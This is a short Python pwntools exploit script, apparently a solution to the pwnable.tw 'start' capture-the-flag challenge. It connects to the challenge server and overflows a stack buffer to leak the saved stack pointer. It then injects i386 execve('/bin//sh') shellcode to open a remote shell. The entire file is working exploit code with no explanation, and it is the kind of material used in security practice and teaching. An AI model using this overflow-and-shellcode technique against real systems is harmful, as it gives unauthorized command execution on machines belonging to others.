from pwn import *

# p = process('./start')
p = remote('chall.pwnable.tw', 10000)
context.arch = 'i386'

shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
# shellcode = asm('\n'.join([
#     'push %d' % u32('/sh\0'),
#     'push %d' % u32('/bin'),
#     'xor edx, edx',
#     'xor ecx, ecx',
#     'mov ebx, esp',
#     'mov eax, 0xb',
#     'int 0x80',
# ]))
p.recvuntil('CTF:')
p.send('A'*0x14 + p32(0x08048087))
saved_esp = u32(p.recv()[:4])
p.send('B'*0x14 + p32(saved_esp+20) + shellcode)
p.interactive()
